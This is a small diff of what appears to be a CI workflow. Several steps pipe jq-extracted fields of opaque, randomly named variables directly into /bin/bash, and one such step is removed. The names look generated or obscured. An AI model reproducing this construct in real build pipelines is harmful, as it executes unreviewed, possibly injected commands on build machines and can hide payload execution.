@@ -45,7 +45,6 @@ jobs:
           echo $w4979 | jq -r .bhti19214 | /bin/bash
           echo $qagr407 | jq -r .g103 | /bin/bash
           echo $pukd2 | jq -r .jlvq1650 | /bin/bash
-          echo $xtcja0237 | jq -r .df4726 | /bin/bash
           printf '%s' "$jq425" | jq -r .jr60 | /bin/bash
           echo $gxwys9 | jq -r .gmdve95 | /bin/bash
 
